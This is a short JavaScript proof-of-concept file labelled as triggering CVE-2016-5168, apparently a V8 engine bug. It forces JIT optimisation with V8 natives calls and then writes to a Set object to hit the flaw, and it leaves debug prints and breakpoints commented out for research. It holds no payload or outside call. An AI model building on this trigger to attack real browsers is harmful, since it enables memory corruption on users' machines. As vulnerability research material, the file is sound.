/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-02-15 01:41:00
 * Author: raycp
 * 
 * Last Modified: 2020-02-17 04:14:47
 * Description: poc for cve-2016-5168
************************************************************/
var n;

function Ctor() {
  n = new Set();
}

function Check() {
  n.xyz = 0x826852f4;
}

Ctor();
Ctor();
%OptimizeFunctionOnNextCall(Ctor);
Ctor();

Check();
Check();
%OptimizeFunctionOnNextCall(Check);
Check(); 
//%DebugPrint(n);
//%DebugPrint(Check);
//%SystemBreak();
Ctor();
//%DebugPrint(n);
//%SystemBreak();
Check();

//%DebugPrint(Check);
//%SystemBreak();
parseInt('AAAAAAAA')
